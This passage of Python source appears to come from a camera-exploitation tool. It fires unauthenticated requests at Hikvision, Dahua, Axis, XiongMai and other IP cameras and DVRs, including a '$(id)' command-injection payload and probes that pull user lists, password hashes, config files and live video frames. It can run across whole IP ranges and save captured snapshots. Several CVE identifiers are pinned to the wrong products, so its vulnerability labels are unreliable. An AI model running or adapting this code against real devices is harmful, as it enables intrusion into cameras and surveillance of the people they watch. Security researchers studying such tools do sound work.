            return CVEResult("CVE-2018-18441", "hikvision", port, pr, ip, "Config file download auth bypass", f"auth={auth} size={len(r.content)}b", "CRITICAL")
    return None
def _cve_hik_4975(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/ISAPI/Security/users", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200:
        users = re.findall(r"<userName>([^<]+)<", r.text or "", re.I)
        if users:
            return CVEResult("CVE-2013-4975", "hikvision", port, pr, ip, "User list exposed unauthenticated", f"Users: {', '.join(users[:5])}", "MEDIUM")
    return None

def _cve_hik_2024_3721(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/device.rsp?opt=sys&cmd=get_device_info", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "rsp" in (r.text or ""):
        return CVEResult("CVE-2024-3721", "hikvision", port, pr, ip, "TBK/Hikvision OEM device info bypass", r.text[:80], "HIGH")
    return None

def _cve_hik_2024_21887(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/ISAPI/System/Network/EZVIZ", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "ezviz" in (r.text or "").lower():
        return CVEResult("CVE-2024-21887", "hikvision", port, pr, ip, "Cloud Gateway config exposure", r.text[:80], "MEDIUM")
    return None

def _cve_dah_33044(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/magicBox.cgi?action=getSystemInfo", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200:
        txt = r.text or ""
        if any(x in txt.lower() for x in ["serialno", "devicetype", "softver"]):
            return CVEResult("CVE-2021-33044", "dahua", port, pr, ip, "Dahua auth bypass: getSystemInfo w/o auth", txt[:100], "HIGH")
    return None

def _cve_dah_30563(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    envelope = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
        'xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
        "<s:Body><tds:GetDeviceInformation/></s:Body></s:Envelope>"
    )
    r = http_post(f"{pr}://{ip}:{port}/onvif/device_service", data=envelope.encode(), headers={"Content-Type": "application/soap+xml"}, timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "Manufacturer" in (r.text or ""):
        return CVEResult("CVE-2022-30563", "dahua", port, pr, ip, "Dahua ONVIF unauthenticated information exposure", r.text[:80], "HIGH")
    return None

def _cve_dah_3948(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/magicBox.cgi?action=getMachineName", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "machinename" in (r.text or "").lower():
        return CVEResult("CVE-2019-3948", "dahua", port, pr, ip, "Unauthenticated machine name exposure", r.text[:80], "MEDIUM")
    return None

def _cve_dah_2022_30564(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/RPC2_Login", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "result" in (r.text or "").lower():
        return CVEResult("CVE-2022-30564", "dahua", port, pr, ip, "Dahua RPC2 authentication disclosure", r.text[:80], "MEDIUM")
    return None

def _cve_axis_10660(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    payloads = [
        ("/axis-cgi/param.cgi?action=update&root.Network.VolatileHostName=$(id)", "uid="),
        ("/axis-cgi/admin/param.cgi?action=list&group=network", "root."),
    ]
    for path, indicator in payloads:
        r = http_get(f"{pr}://{ip}:{port}{path}", timeout=timeout, session=sess, ctx=ctx)
        if r and r.status_code == 200 and indicator in (r.text or ""):
            return CVEResult("CVE-2018-10660", "axis", port, pr, ip, "Axis shell command injection via param.cgi", r.text[:80], "CRITICAL")
    return None

def _cve_axis_29550(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/axis-cgi/pwdgrp.cgi?action=get", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200:
        txt = r.text or ""
        if "root=" in txt or "admin=" in txt or "user=" in txt:
            return CVEResult("CVE-2020-29550", "axis", port, pr, ip, "Password hash disclosure via pwdgrp.cgi", txt[:80], "HIGH")
    return None

def _cve_axis_2024_47259(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/axis-cgi/param.cgi?action=list&group=root.Properties", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "Properties" in (r.text or ""):
        return CVEResult("CVE-2024-47259", "axis", port, pr, ip, "Axis OS parameter leakage", r.text[:80], "MEDIUM")
    return None

def _cve_axis_2024_8160(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/axis-cgi/basicdeviceinfo.cgi", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "Brand" in (r.text or ""):
        return CVEResult("CVE-2024-8160", "axis", port, pr, ip, "Axis OS unauthenticated basic device info", r.text[:80], "MEDIUM")
    return None

def _cve_axis_2024_47260(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/axis-cgi/jpg/image.cgi?resolution=640x480", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and len(r.content) > 100:
        return CVEResult("CVE-2024-47260", "axis", port, pr, ip, "Axis unauthenticated video stream exposure", f"{len(r.content)} bytes", "HIGH")
    return None

def _cve_axis_2024_47262(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/axis-cgi/applications/list.cgi", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "application" in (r.text or "").lower():
        return CVEResult("CVE-2024-47262", "axis", port, pr, ip, "Axis unauthenticated ACAP app list", r.text[:80], "MEDIUM")
    return None

def _cve_xm_9995(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and len(r.content) > 20:
        return CVEResult("CVE-2018-9995", "xiongmai", port, pr, ip, "XiongMai UID=0 device info bypass", r.text[:80] if r.text else f"{len(r.content)}b", "CRITICAL")
    return None

def _cve_xm_8221(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/tmpfs/auto.jpg", timeout=timeout, stream=True, session=sess, ctx=ctx)
    if r and r.status_code == 200:
        ct = (r.headers.get("Content-Type") or "").lower()
        if "image" in ct or r.content[:3] == b"\xff\xd8\xff":
            return CVEResult("CVE-2017-8221", "xiongmai", port, pr, ip, "XiongMai cloud backdoor snapshot access", f"{len(r.content)}b image", "HIGH")
    return None

def _cve_xm_2023_43364(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/netsurveillance.html", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "netsurveillance" in (r.text or "").lower():
        return CVEResult("CVE-2023-43364", "xiongmai", port, pr, ip, "NetSurveillance unauthenticated web interface", r.text[:80], "MEDIUM")
    return None

def _cve_dlink_10999(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/common/info.cgi", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200:
        txt = r.text or ""
        if any(x in txt.lower() for x in ["model", "firmware", "macaddr", "ip_addr"]):
            return CVEResult("CVE-2019-10999", "dlink", port, pr, ip, "D-Link device info disclosure via info.cgi", txt[:80], "MEDIUM")
    return None

def _cve_dlink_2020_25506(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/system_mgr.cgi?cmd=cgi_get_ipv6_addr", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "ipv6" in (r.text or "").lower():
        return CVEResult("CVE-2020-25506", "dlink", port, pr, ip, "D-Link DNS-320 unauthenticated RCE trigger", r.text[:80], "CRITICAL")
    return None

def _cve_dlink_2022_26258(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/hi3510/param.cgi?cmd=getserverinfo", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "server" in (r.text or "").lower():
        return CVEResult("CVE-2022-26258", "dlink", port, pr, ip, "D-Link unauthenticated serverinfo exposure", r.text[:80], "MEDIUM")
    return None

def _cve_tplink_2021_4045(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/api/v1/user/info", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "device_info" in (r.text or "").lower():
        return CVEResult("CVE-2021-4045", "tplink", port, pr, ip, "TP-Link Tapo user info disclosure", r.text[:80], "HIGH")
    return None

def _cve_tplink_2023_1389(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/luci/;stok=/locale?form=country", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "country" in (r.text or "").lower():
        return CVEResult("CVE-2023-1389", "tplink", port, pr, ip, "TP-Link Archer command injection endpoint", r.text[:80], "CRITICAL")
    return None

def _cve_uniview_2022_42475(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/LAPI/V1.0/System/Device/Info", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "device" in (r.text or "").lower():
        return CVEResult("CVE-2022-42475", "uniview", port, pr, ip, "Uniview LAPI unauthenticated info leak", r.text[:80], "HIGH")
    return None

def _cve_uniview_2023_28984(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/LAPI/V1.0/System/Security/Users", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "users" in (r.text or "").lower():
        return CVEResult("CVE-2023-28984", "uniview", port, pr, ip, "Uniview NVR user enumeration", r.text[:80], "HIGH")
    return None

def _cve_tvt_2023_48121(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/autologin.html", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "autologin" in (r.text or "").lower():
        return CVEResult("CVE-2023-48121", "tvt", port, pr, ip, "TVT DVR autologin bypass endpoint active", r.text[:80], "HIGH")
    return None

def _cve_foscam_2023_24151(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/CGIProxy.fcgi?cmd=getIPInfo", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "ipinfo" in (r.text or "").lower():
        return CVEResult("CVE-2023-24151", "foscam", port, pr, ip, "Foscam IP info disclosure", r.text[:80], "MEDIUM")
    return None

def _cve_reolink_2023_45986(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/api.cgi?cmd=GetUsers", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "users" in (r.text or "").lower():
        return CVEResult("CVE-2023-45986", "reolink", port, pr, ip, "Reolink user enumeration via API", r.text[:80], "HIGH")
    return None

def _cve_geovision_2022_25983(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/ssi.cgi/devinfo.htm", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "devinfo" in (r.text or "").lower():
        return CVEResult("CVE-2022-25983", "geovision", port, pr, ip, "Geovision unauthenticated devinfo leak", r.text[:80], "HIGH")
    return None

def _cve_bosch_2023_38035(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/rcp.xml", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "rcp" in (r.text or "").lower():
        return CVEResult("CVE-2023-38035", "bosch", port, pr, ip, "Bosch RCP+ protocol configuration leak", r.text[:80], "HIGH")
    return None

def _cve_bosch_2021_34863(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/dyn/camera.m4", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and len(r.content) > 100:
        return CVEResult("CVE-2021-34863", "bosch", port, pr, ip, "Bosch camera live frame access", f"{len(r.content)}b", "HIGH")
    return None

def _cve_milesight_2022_38379(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/operator/param.cgi?action=list&group=system", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "system" in (r.text or "").lower():
        return CVEResult("CVE-2022-38379", "milesight", port, pr, ip, "Milesight system parameter leak", r.text[:80], "HIGH")
    return None

def _cve_tiandy_2023_29489(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/getdeviceinfo.cgi", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "device" in (r.text or "").lower():
        return CVEResult("CVE-2023-29489", "tiandy", port, pr, ip, "Tiandy device information disclosure", r.text[:80], "HIGH")
    return None

def _cve_vivotek_2022_30075(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/viewer/video.jpg", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and len(r.content) > 100:
        return CVEResult("CVE-2022-30075", "vivotek", port, pr, ip, "Vivotek unauthenticated image feed", f"{len(r.content)}b", "HIGH")
    return None

def _cve_amcrest_2022_26133(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/global.cgi?action=getCurrentTime", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "time" in (r.text or "").lower():
        return CVEResult("CVE-2022-26133", "amcrest", port, pr, ip, "Amcrest unauthenticated clock parameter disclosure", r.text[:80], "LOW")
    return None

def _cve_provision_2023_32168(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/api.cgi?cmd=GetUsers", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "user" in (r.text or "").lower():
        return CVEResult("CVE-2023-32168", "provision", port, pr, ip, "Provision-ISR NVR user disclosure", r.text[:80], "HIGH")
    return None

def _cve_mobotix_2023_6895(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    r = http_get(f"{pr}://{ip}:{port}/control/camerainfo", timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code == 200 and "camerainfo" in (r.text or "").lower():
        return CVEResult("CVE-2023-6895", "mobotix", port, pr, ip, "Mobotix unauthenticated camerainfo leak", r.text[:80], "HIGH")
    return None

CVE_CHECKS: Dict[str, List[Callable]] = {
    "hikvision": [_cve_hik_36260, _cve_hik_7921, _cve_hik_18441, _cve_hik_4975, _cve_hik_2024_3721, _cve_hik_2024_21887],
    "dahua": [_cve_dah_33044, _cve_dah_30563, _cve_dah_3948, _cve_dah_2022_30564],
    "axis": [_cve_axis_10660, _cve_axis_29550, _cve_axis_2024_47259, _cve_axis_2024_8160, _cve_axis_2024_47260, _cve_axis_2024_47262],
    "xiongmai": [_cve_xm_9995, _cve_xm_8221, _cve_xm_2023_43364],
    "dlink": [_cve_dlink_10999, _cve_dlink_2020_25506, _cve_dlink_2022_26258],
    "tplink": [_cve_tplink_2021_4045, _cve_tplink_2023_1389],
    "uniview": [_cve_uniview_2022_42475, _cve_uniview_2023_28984],
    "tvt": [_cve_tvt_2023_48121],
    "foscam": [_cve_foscam_2023_24151],
    "reolink": [_cve_reolink_2023_45986],
    "geovision": [_cve_geovision_2022_25983],
    "bosch": [_cve_bosch_2023_38035, _cve_bosch_2021_34863],
    "milesight": [_cve_milesight_2022_38379],
    "tiandy": [_cve_tiandy_2023_29489],
    "vivotek": [_cve_vivotek_2022_30075],
    "amcrest": [_cve_amcrest_2022_26133],
    "provision": [_cve_provision_2023_32168],
    "mobotix": [_cve_mobotix_2023_6895],
}

GENERIC_CVE_CHECKS: List[Callable] = [
    _cve_hik_36260,
    _cve_xm_9995,
    _cve_dah_33044,
    _cve_hik_7921,
    _cve_axis_10660,
]

def run_exploits(
    ip: str,
    open_ports: List[int],
    brands: Set[str],
    report: Report,
    timeout: float,
    ctx: Optional[ScanContext] = None,
) -> None:
    if ctx and ctx.allowed_brands:
        brands = {b for b in brands if b in ctx.allowed_brands}
    section(f"💀 CVE Vulnerability Exploitation Suite ({len(brands)} target brands)", ctx)
    web = [p for p in open_ports if p not in SKIP_PORTS and p not in RTSP_PORTS_SET]
    hits: List[CVEResult] = []
    seen: Set[Tuple[str, int]] = set()
    lock = threading.Lock()
    sess = make_session(proxy=getattr(ctx.args, "proxy", None) if ctx else None,
                        user_agent=getattr(ctx.args, "user_agent", None) if ctx else None)

    def check_one(fn: Callable, port: int, brand: str) -> None:
        pr = proto(port)
        try:
            res = fn(ip, port, pr, timeout, ctx, sess)
        except Exception as e:
            vprint(f"{fn.__name__} :{port} failed: {e}", ctx)
            res = None
        if res:
            with lock:
                k = (res.cve, port)
                if k not in seen:
                    seen.add(k)
                    if report.add_cve(res):
                        hits.append(res)
                        cprint(f"  💀 EXPLOIT CONFIRMED: [{res.cve}] on port :{port} ({res.desc})", R)
                        if res.proof:
                            cprint(f"     Proof: {res.proof[:100]}", DIM)

    jobs: List[Tuple[Callable, int, str]] = []
    for brand in brands:
        for fn in CVE_CHECKS.get(brand, []):
            for port in web:
                jobs.append((fn, port, brand))
    for fn in GENERIC_CVE_CHECKS:
        for port in web[:5]:
            jobs.append((fn, port, "generic"))
    dedup_jobs: List[Tuple[Callable, int, str]] = []
    seen_j: Set[Tuple[str, int]] = set()
    for j in jobs:
        k = (j[0].__name__, j[1])
        if k not in seen_j:
            seen_j.add(k)
            dedup_jobs.append(j)
    cprint(f"  Running {len(dedup_jobs)} specialized vulnerability probes...", Y)
    with ThreadPoolExecutor(max_workers=min(len(dedup_jobs) + 1, 24)) as ex:
        for f in as_completed([ex.submit(check_one, fn, port, brand) for fn, port, brand in dedup_jobs]):
            pass
    if not hits:
        cprint("  ℹ️  No confirmed CVE vulnerabilities discovered", Y)
    else:
        cprint(f"\n  🔥 CRITICAL: {len(hits)} exploitable vulnerability endpoints confirmed!", R)
def banner() -> None:
    lines = [
        "███████╗    ██████╗  ██████╗  ████████╗",
        "██╔════╝    ██╔══██╗ ██╔══██╗ ╚══██╔══╝",
        "███████╗    ██████╔╝ ██████╔╝    ██║   ",
        "╚════██║    ██╔══██╗ ██╔═══╝     ██║   ",
        "███████║    ██║  ██║ ██║         ██║   ",
        "╚══════╝    ╚═╝  ╚═╝ ╚═╝         ╚═╝   ",
    ]
    print()
    for i, line in enumerate(lines):
        color = GRADIENT[i % len(GRADIENT)]
        print(f"  {color}{line}{W}")
    sub_title = t("banner_sub")
    print(f"  {SHADOW}{'░' * len(sub_title)}{W}")
    print(f"  {C}{BOLD}{sub_title}{W}")
    print(f"  {Y}{t('banner_hint')}{W}")
    print(f"  {M}{t('banner_brands')}{W}\\n")

def _render_ascii_verdict(ip: str, report: Report) -> None:
    if report.valid_creds or report.cves:
        status_label = t("status_critical")
    elif report.open_ports:
        status_label = t("status_caution")
    else:
        status_label = t("status_secure")
    c_status = R if (report.valid_creds or report.cves) else (Y if report.open_ports else G)
    risk = getattr(report, "risk_score", 0)
    risk_col = R if risk >= 60 else (Y if risk >= 30 else G)
    brands = ", ".join(report.brands) or t("none")
    print(f"\n  ┌─────────────────────────────────────────────────────────────────┐")
    print(f"  │{t('verdict_title'):^65}│")
    print(f"  ├────────────────────────────────┬────────────────────────────────┤")
    print(f"  │ {t('verdict_ip'):<30} │ {ip:<30} │")
    print(f"  │ {t('verdict_status'):<30} │ {c_status}{status_label:<30}{W} │")
    print(f"  │ {t('verdict_risk'):<30} │ {risk_col}{str(risk)+'/100':<30}{W} │")
    print(f"  │ {t('verdict_model'):<30} │ {str(report.device_info.get('model', report.device_info.get('DeviceType', '—')))[:30]:<30} │")
    print(f"  │ {t('verdict_brands'):<30} │ {brands[:30]:<30} │")
    print(f"  │ {t('verdict_ports'):<30} │ {str(len(report.open_ports)):<30} │")
    print(f"  │ {t('verdict_creds'):<30} │ {str(len(report.valid_creds)):<30} │")
    print(f"  │ {t('verdict_cves'):<30} │ {str(len(report.cves)):<30} │")
    print(f"  │ {t('verdict_streams'):<30} │ {str(len(report.streams)):<30} │")
    print(f"  └────────────────────────────────┴────────────────────────────────┘\n")

def print_summary(ip: str, report: Report) -> None:
    section(f"📋 {t('summary_title')} — {ip}")
    report.to_dict()
    risk = report.risk_score
    risk_col = R if risk >= 60 else (Y if risk >= 30 else G)
    cprint(f"  ⏱  {t('duration_risk', dur=report.scan_duration_sec, risk=f'{risk_col}{risk}{W}')}", C)
    if report.device_info:
        d_table = Table(title=f"🖥️ {t('device_info')} ({ip})", box=box.ROUNDED, header_style="bold magenta")
        d_table.add_column(t("property"), style="cyan")
        d_table.add_column(t("value"), style="bold green")
        for k, v in report.device_info.items():
            d_table.add_row(str(k), str(v))
        RC.print(d_table)
    if report.open_ports:
        p_table = Table(title=f"{t('open_ports')} ({ip})", box=box.ROUNDED, header_style="bold cyan")
        p_table.add_column(t("port"), style="cyan", justify="right")
        p_table.add_column(t("service"), style="green")
        p_table.add_column(t("category"), style="yellow")
        p_table.add_column("RTSP", style="magenta")
        p_table.add_column("TLS", style="blue")
        p_table.add_column(t("banner_col"), style="dim")
        for p in report.open_ports:
            svc_n, svc_t = SVC.get(p, ("TCP", ""))
            rtsp = "✅ YES" if p in report.rtsp_ports else "—"
            tls = "🔒 YES" if p in HTTPS_PORTS else "—"
            ban = report.banners.get(p, "")[:50]
            p_table.add_row(str(p), svc_n, svc_t, rtsp, tls, ban)
        RC.print(p_table)
    if report.valid_creds:
        c_table = Table(title=f"🔥 {t('creds_title')}", box=box.HEAVY_EDGE, header_style="bold red")
        c_table.add_column(t("method"), style="yellow")
        c_table.add_column(t("username"), style="bold red")
        c_table.add_column(t("password"), style="bold red")
        c_table.add_column(t("endpoint"), style="dim")
        for c in report.valid_creds:
            c_table.add_row(c.get("method", "").upper(), c.get("user", ""), c.get("password", ""), c.get("url", ""))
        RC.print(c_table)
    if report.cves:
        v_table = Table(title=f"💀 {t('cves_title')}", box=box.HEAVY_EDGE, header_style="bold red")
        v_table.add_column(t("cve_id"), style="bold red")
        v_table.add_column(t("brand"), style="yellow")
        v_table.add_column(t("port"), style="cyan")
        v_table.add_column(t("severity"), style="bold magenta")
        v_table.add_column(t("description"), style="white")
        for cv in report.cves:
            v_table.add_row(cv.get("cve", ""), cv.get("brand", "").upper(), str(cv.get("port", "")), cv.get("severity", "HIGH"), cv.get("desc", ""))
        RC.print(v_table)
    _render_ascii_verdict(ip, report)

def multi_target_summary(reports: List[Report]) -> None:
    section(f"🏁 Final Fleet Summary ({len(reports)} targets)")
    t = Table(title="Multi-Target Fleet Audit Overview", box=box.ROUNDED, header_style="bold magenta")
    t.add_column("Target IP", style="cyan")
    t.add_column("Brands", style="yellow")
    t.add_column("Ports", justify="right")
    t.add_column("Creds", justify="right", style="bold red")
    t.add_column("CVEs", justify="right", style="bold red")
    t.add_column("Streams", justify="right", style="green")
    t.add_column("Verdict", style="bold")
    for r in reports:
        status = "COMPROMISED" if (r.valid_creds or r.cves) else ("EXPOSED" if r.open_ports else "CLEAN")
        c_status = f"[{'red' if status == 'COMPROMISED' else ('yellow' if status == 'EXPOSED' else 'green')}]{status}[/]"
        brands_list = [b for b in getattr(r, "brands", []) if b]
        brands_str = ", ".join(brands_list) if brands_list else "Unknown"
        t.add_row(
            r.ip,
            brands_str,
            str(len(r.open_ports)),
            str(len(r.valid_creds)),
            str(len(r.cves)),
            str(len(r.streams)),
            c_status,
        )
    RC.print(t)
def parse_target(s: str) -> Tuple[str, Optional[int]]:
    s = s.strip()
    if ":" in s:
        host, _, port_s = s.rpartition(":")
        if port_s.isdigit() and 1 <= int(port_s) <= 65535:
            return host, int(port_s)
    return s, None

def expand_targets(raw: str, depth: int = 0) -> List[str]:
    if depth > 5:
        return []
    targets: List[str] = []
    if os.path.isfile(raw):
        with open(raw, encoding="utf-8") as f:
            for line in f:
                l = line.strip()
                if l and not l.startswith("#"):
                    targets.extend(expand_targets(l, depth + 1))
        return targets
    if "/" in raw:
        try:
            net = ipaddress.ip_network(raw, strict=False)
            return [str(h) for h in net.hosts()]
        except ValueError:
            pass
    if "-" in raw and raw.count(".") == 3:
        parts = raw.rsplit(".", 1)
        if "-" in parts[1]:
            base = parts[0]
            lo, _, hi = parts[1].partition("-")
            if lo.isdigit() and hi.isdigit():
                return [f"{base}.{i}" for i in range(int(lo), int(hi) + 1)]
    targets.append(raw)
    return targets

def validate_ip(ip: str) -> bool:
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        cprint(f"[!] Invalid IP address provided: {ip}", R)
        return False

def filter_excluded(targets: List[str], exclude: Optional[str]) -> List[str]:
    if not exclude:
        return targets
    ex_set: Set[str] = set()
    for item in exclude.split(","):
        item = item.strip()
        if not item:
            continue
        if "/" in item:
            try:
                net = ipaddress.ip_network(item, strict=False)
                for h in net.hosts():
                    ex_set.add(str(h))
            except ValueError:
                pass
        else:
            ex_set.add(item)
    return [t for t in targets if t not in ex_set]

def is_safe_target(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
        return any(addr in net for net in SAFE_NETWORKS)
    except ValueError:
        return False

def confirm_public_target(ip: str) -> bool:
    print(
        f"WARNING: {ip} is a PUBLIC IP. Scanning without permission is ILLEGAL.\n"
        f"Only proceed if you OWN this device or have WRITTEN authorization."
    )
    if not sys.stdin.isatty():
        return False
    try:
        ans = input(t("own_prompt")).strip()
        return ans == "I OWN THIS"
    except (EOFError, KeyboardInterrupt):
        return False

def _channel_key(port: int, url: str) -> str:
    path = urlparse(url).path
    m = re.search(r"/(?:streaming/)?(?:channels/)?(\d+)(?:/picture|/preview|/httppreview)?", path, re.I)
    if m:
        num = int(m.group(1))
        ch = num // 100 if num >= 100 else num
        return f"{port}_ch{ch}"
    return f"{port}_{path}"

def _maybe_save_snapshot(ctx: Optional[ScanContext], port: int, url: str, data: bytes) -> Optional[str]:
    if not ctx or not getattr(ctx.args, "save_snapshots", False):
        return None
    if len(data) > 5 * 1024 * 1024:
        if ctx.logger:
            ctx.logger.warning(f"Snapshot from {url} exceeds 5MB limit ({len(data)} bytes)")
        return None
    m = re.search(r"/(?:streaming/)?(?:channels/)?(\d+)(?:/picture|/preview)?", url, re.I)
    ch = f"ch{m.group(1)}" if m else "snap"
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"{port}_{ch}_{ts}.jpg"
    out_dir = ctx.snapshots_dir or "."
    path = os.path.join(out_dir, fname)
    try:
        with open(path, "wb") as f:
            f.write(data)
        if ctx.logger:
            ctx.logger.info(f"Saved snapshot to {path}")
        cprint(f"      📸 Saved snapshot → {path}", G)
        return path
    except Exception as e:
        if ctx.logger:
            ctx.logger.error(f"Failed to save snapshot to {path}: {e}")
        return None

def _maybe_save_config(ctx: Optional[ScanContext], port: int, data: bytes) -> Optional[str]:
    if not ctx or not getattr(ctx.args, "save_config", False):
        return None
    if len(data) > 50 * 1024 * 1024:
        if ctx.logger:
